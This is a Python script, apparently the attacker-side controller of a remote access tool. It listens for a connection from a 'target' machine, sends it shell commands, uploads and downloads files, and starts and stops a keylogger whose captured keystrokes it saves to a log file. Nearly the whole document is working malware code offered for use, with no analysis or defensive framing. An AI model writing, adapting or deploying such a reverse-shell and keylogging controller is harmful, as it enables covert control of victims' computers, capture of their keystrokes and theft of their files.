# Remote Shell

# Description:
# This script establishes a remote shell connection with a target machine, allowing the execution
# of various commands and file operations.


import socket
import threading
import os
import json
from datetime import datetime

l_host =  # Server IP
l_port =  # Server PORT


# Function to dump logs into a file
def dump_log_file():
    with open(log_file, "a") as log:
        log.write(dump_logging)


# Function for logging received data
def thread_logger():
    global stop_logging
    global dump_logging
    if stop_logging == 0:
        while True:
            R_OUTPUT = target.recv(1024).decode()
            print(R_OUTPUT, end='')
            dump_logging += R_OUTPUT
    else:
        return


# Function to send data to the target
def send_data_as_json(data, target_socket):
    json_data = json.dumps(data)
    target_socket.send(json_data.encode())


# Function to receive data from the target
def receive_data_as_json(target_socket):
    received_data = ''
    while True:
        try:
            received_data += target_socket.recv(1024).decode().rstrip()
            return json.loads(received_data)
        except json.JSONDecodeError:
            continue


# Function to upload a file to the target
def upload_file(file_name):
    try:
        with open(file_name, 'rb') as up_file:
            target.send(up_file.read())
    except Exception as e_upload_file:
        print(f"Error uploading file: {e_upload_file}")


# Function to download a file from the target
def download_file(file_name):
    try:
        with open(file_name, 'wb') as down_file:
            target.settimeout(1)
            while True:
                chunk = target.recv(1024)
                if not chunk:
                    break
                down_file.write(chunk)
    except socket.timeout:
        pass  # Ignore timeouts
    except Exception as e_download_file:
        print(f"Error downloading file: {e_download_file}")
    finally:
        target.settimeout(None)


if __name__ == "__main__":
    stop_logging = 0
    dump_logging = ""

    # Create a log file with the current date and time
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y_%H-%M")}.txt'

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.bind((l_host, l_port))
    print("[•] Listening for incoming connections")
    server_sock.listen(5)

    target, r_host = server_sock.accept()
    print("[+] connected to: " + str(r_host))

    while True:
        command = input("[$] shell~# ")
        if command == '':
            # Don't send anything if the command is empty
            continue

        elif command.lower() == 'help':
            print("""
            [*] Shell commands

            • Keyscan_start/stop - Initiates keylogger. 
            After stopping, the keylog is saved in the same directory as the script.

            • Download/upload - download or upload files to/from the directory where the script is running
            """)
            continue

        # Send the command to the target
        send_data_as_json(command, target)

        if command.lower() == 'quit':
            target.close()
            exit(0)

        elif command.startswith('cd '):
            # Handle change directory command
            pass

        elif command in ['clear', 'cls']:
            # Handle clear screen command
            clear_command = 'clear' if command == 'clear' else 'cls'
            os.system(clear_command)

        elif command.lower() == 'keyscan_start':
            print("[+] Keylogger started.")
            thread_Log = threading.Thread(target=thread_logger)
            thread_Log.start()

        elif command.lower() == 'keyscan_stop':
            dump_log_file()
            stop_logging = 1
            print("[-] Keylogger stopped.")
            print("[+] keylog saved to Dump file")

        elif command.startswith('download'):
            download_file(command[9:])
        elif command.startswith('upload'):
            upload_file(command[7:])

        else:
            result = receive_data_as_json(target)
            print(result)
